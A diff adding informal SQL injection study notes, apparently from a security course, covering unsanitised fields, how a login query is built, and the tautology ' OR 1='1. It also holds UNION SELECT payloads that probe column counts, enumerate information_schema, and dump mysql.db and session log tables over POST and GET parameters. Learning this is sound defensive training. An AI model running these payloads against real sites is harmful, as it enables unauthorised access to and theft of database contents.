@@ -338,15 +338,116 @@ Or some shit -   . .     -
                \     /
                 ||
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+SQL Injection - Considerations
+
+    Requires Valid SQL Queries
+
+    Fully patched systems can be vulnerable due to misconfiguration
+
+    Input Field Sanitization
+
+    String vs Integer Values
+
+    Is information_schema Database available?
+
+    GET Request versus POST Request HTTP methods
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Unsanitized vs Sanitized Fields
+
+Unsanitized: input fields can be found using a Single Quote ⇒ '
+
+
+    Will return extraneous information
+
+    ' closes a variable, to allow for additional statements/clauses
+
+    May show no errors or generic error (harder Injection)
+
+
+Sanitized: input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)
+
+
+Validation: checks inputs to ensure it meets a criteria (String doesn’t contain ')
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Server-Side Query Processing
+
+User enters JohnDoe243 in the name form field and pass1234 in the pass form field.
+
+
+The Server-Side Query that would be passed to MySQL from PHP would be:
+
+
+BEFORE INPUT:
+
+SELECT id FROM users WHERE name=‘$name’ AND pass=‘$pass’;
+
+
+AFTER INPUT:
+
+SELECT id FROM users WHERE name=‘JohnDoe243’ AND pass=‘pass1234’;
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Example - Injecting Your Statement
+
+User enters tom' OR 1='1 in the name and pass fields.
+
+
+Truth Statement: tom ' OR 1='1
+
+
+Server-Side query executed would appear like this:
+
+
+SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+##Golden Statement
+UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
+              <column>     <column>    <column>       <database>.        <table>
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Once on sql server:
+sql server> mysql
+MariaDB [(none)]> show databases ;
+MariaDB [(none)]> use information_schema ;
+MariaDB [(information_schema)]> show tables from information_schema ;
+MariaDB [(information_schema)]> show columns from columns ;
+MariaDB [(information_schema)]> select table_schema from information_schema.colums ;
+MariaDB [(information_schema)]> select table_name from information_schema.columns ;
+MariaDB [(information_schema)]> select column_name from information_schema.columns ;
+MariaDB [(information_schema)]> select table_schema,table_name,column_name from information_schema.columns
+MariaDB [(information_schema)]> select name,cost,year from session.car
+                                  <column><column><column>  <database>.<table>
+Audi ' UNION SELECT Db,2,Host,User,5 FROM mysql.db #
+
+Audi ' UNION SELECT session_id,2,user_id,status,start FROM session.session_log #
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Information_Schema
+  Tables
+    Columns
+
+Table Schema has all the data bases
+Table name has the names of all the tables in all the data bases
+Column name has all the names of all the colmns in the all the data bases
+' OR 1='1
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Post Edition SQL injection
+Audi ' UNION SELECT 1,2,3,4 #' <- Do this to see how many fields the request wants. Increment until it triggers
+
+## Modify golden statement to include all information
+UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #                     <- add buffer numbers (2 and 5) so that the golden statement will run
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Get edition SQL injection
+
+##Identify Vulnerable field 
+?Selection=4 OR 1=1
+
+##Identift Number of columns
+?Selection=3 UNION SELECT 1,2,3
+
+##DISPLAY table is out of order
+
+## GOLDEN STATEMENT FROM BEFORE
+UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
